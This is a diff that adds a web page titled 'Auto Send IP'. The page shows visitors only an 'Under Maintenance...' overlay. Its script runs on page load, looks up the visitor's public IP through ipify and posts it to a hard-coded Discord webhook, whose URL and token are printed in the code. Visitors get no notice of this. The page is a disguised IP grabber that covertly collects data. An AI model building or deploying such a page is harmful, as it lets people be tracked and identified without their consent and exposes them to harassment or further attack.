@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Send IP</title>
+  <style>
+    body {
+      text-align: center;
+      margin-top: 50px;
+      background-color: black; /* Set background to black */
+      color: white; /* Set text color to white for visibility */
+      height: 100vh; /* Full height */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 24px;
+      z-index: 10; /* Ensure overlay is on top */
+    }
+  </style>
+</head>
+<body>
+
+<div id="overlay">Under Maintenance...</div>
+
+<script>
+  function fetchAndSendIP() {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const userIP = data.ip;
+        
+        // Send the IP to the webhook
+        fetch('https://discord.com/api/webhooks/1372872545396588666/HmJyhyOhUR9fA782D96YY2qUEFS3gdpskvFP4e4sA9yUvr1x7XYkKk0FS1lbHpFLM3Tf', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ content: `User  IP: ${userIP}` })
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('IP sent successfully!');
+            // Optionally, you can hide the overlay or keep it as is
+          } else {
+            console.error('Failed to send IP.');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending IP:', error);
+        });
+      })
+      .catch(error => {
+        document.getElementById('overlay').innerText = 'Failed to retrieve IP.';
+        console.error('Error fetching IP:', error);
+      });
+  }
+
+  // Call the function to fetch and send IP when the page loads
+  window.onload = fetchAndSendIP;
+</script>
+
+</body>
+</html>
